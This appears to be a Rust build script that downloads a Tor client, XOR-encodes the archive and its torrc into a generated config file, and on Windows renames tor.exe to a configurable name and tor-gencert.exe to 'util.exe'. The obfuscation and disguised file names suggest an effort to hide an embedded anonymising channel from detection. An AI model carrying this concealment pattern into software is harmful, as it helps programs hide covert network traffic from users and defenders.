mod src;

extern crate rand;

use std::{fs, error, collections, process, io};
use src::{xor, setting, http};
use std::path::{PathBuf, Path};
use std::fs::File;
use std::io::Write;


const CFG_TEMPLATE: &str = "config.rs.template";
const CFG_DESTINATION: &str = "src/config.rs";

struct BuildSetting {
    is_tor_for_windows: bool,
    key: String,
    windows_url: String,
    windows_dir: String,
    linux_url: String,
    linux_dir: String,
    torrc: String,
    name: String
}

fn main() -> Result<(), Box<dyn error::Error>> {
    let raw_settings: json::JsonValue = load_settings()?;

    let setting = parse_settings(&raw_settings);

    let mut torrc = fs::read_to_string(&setting.torrc)?;

    let platform_tor_dir;

    if setting.is_tor_for_windows {
        platform_tor_dir = &setting.windows_dir;
    } else {
        platform_tor_dir = &setting.linux_dir;

        torrc += "\nControlSocketsGroupWritable 1";
        torrc += "\nControlSocket @{CTRL_SOCKET}";
    }

    let tor_dir = Path::new(&platform_tor_dir)
        .join(&setting.name)
        .join("App");

    let mut replacements = collections::HashMap::new();

    replacements.insert("@{NAME}", setting.name.clone());
    replacements.insert("@{ENC_KEY}", setting.key.clone());

    let enc_tor_dir = xor::encode(
        &setting.key,
        &String::from(tor_dir.to_str().unwrap())
    );
    replacements.insert("@{ENC_TOR_DIR}", enc_tor_dir);

    let enc_torrc = xor::encode(
        &setting.key,
        &torrc
    );
    replacements.insert("@{ENC_TORRC}", enc_torrc);

    replacements.insert("@{ENC_TOR_BUNDLE}", bundle_tor(&setting)?);

    match replace_settings(
        &String::from(CFG_TEMPLATE),
        &replacements
    ) {
        Ok(data) => fs::write(CFG_DESTINATION, data)?,
        Err(error) => return Result::Err(error)
    };

    Ok(())
}

fn bundle_tor(setting: &BuildSetting) -> Result<String, Box<dyn error::Error>> {
    let url = if setting.is_tor_for_windows { &setting.windows_url } else { &setting.linux_url };

    let dir;
    let tmp_dir;

    if url.starts_with("file://") {
        dir = url.strip_prefix("file://").unwrap();
    } else {
        tmp_dir = download_and_extract_tor(&url, setting)?;
        dir = tmp_dir.path().to_str().unwrap();
    }

    let mut archive = tar::Builder::new(Vec::new());
    archive.append_dir_all(&setting.name, &dir)?;

    let data = archive.into_inner()?;

    let bundle = xor::encode_bytes(&setting.key, &data);
    Ok(bundle)
}

fn download_and_extract_tor(
    url: &String,
    setting: &BuildSetting
) -> Result<tempfile::TempDir, Box<dyn error::Error>> {
    let mut file = tempfile::NamedTempFile::new()?;

    http::download(url, &mut file.reopen()?)?;

    let dir = tempfile::tempdir()?;
    let path = dir.path().to_owned();

    if setting.is_tor_for_windows {
        let mut zip = zip::ZipArchive::new(file)?;
        zip.extract(&dir)?;

        fs::rename(path.join("Tor"), path.join("App"))?;

        fs::rename(
            path.join("App").join("tor.exe"),
            path.join("App").join(format!("{}.exe", &setting.name))
        )?;

        fs::rename(
            path.join("App").join("tor-gencert.exe"),
            path.join("App").join("util.exe")
        )?;

        fs::remove_dir_all(path.join("Data"))?;
    } else {
        let status = process::Command::new("tar")
            .args(["-xf", file.path().to_str().unwrap()])
            .current_dir(&dir)
            .status()?;

        if !status.success() {
            return Result::Err(String::from("problem extracting archive").into());
        }
    }

    Ok(dir)
}

fn load_settings() -> Result<json::JsonValue, Box<dyn error::Error>> {
    let source = fs::read_to_string("settings.json")?;
    Ok(json::parse(&source)?)
}

fn replace_settings(
    template: &String,
    replacements: &collections::HashMap<&str, String>
) -> Result<String, Box<dyn error::Error>> {
    let mut config_source = fs::read_to_string(template)?;

    for (pattern, content) in replacements {
        config_source = config_source.replace(pattern, &content);
    }

    Ok(config_source)
}

fn parse_settings(raw: &json::JsonValue) -> BuildSetting {
    let key;
    if raw.has_key("key") {
        key = String::from(
            raw["key"].as_str().unwrap_or_else(|| {
                panic!("key must be a string");
            })
        );
    } else {
        key = xor::secret_key();
    }

    let windows_url = String::from(
        raw["tor_urls"]["windows"]
            .as_str()
            .unwrap_or_else(|| {
                panic!("windows url must be a string");
            })
    );

    let linux_url = String::from(
        raw["tor_urls"]["linux"]
            .as_str()
            .unwrap_or_else(|| {
                panic!("linux url must be a string");
            })
    );

    let windows_dir = String::from(
        raw["tor_dirs"]["windows"]
            .as_str()
            .unwrap_or_else(|| {
                panic!("windows path must be a string");
            })
    );

    let linux_dir = String::from(
        raw["tor_dirs"]["linux"]
            .as_str()
            .unwrap_or_else(|| {
                panic!("linux path must be a string");
            })
    );

    let torrc = String::from(
        raw["torrc"]
            .as_str()
            .unwrap_or_else(|| {
                panic!("torrc must be a string");
            })
    );

    let name = String::from(
        raw["name"]
            .as_str()
            .unwrap_or_else(|| {
                panic!("name must be a string");
            })
    );

    BuildSetting {
        is_tor_for_windows: cfg!(feature = "tor_for_windows"),
        key,
        windows_url,
        windows_dir,
        linux_url,
        linux_dir,
        torrc,
        name
    }
}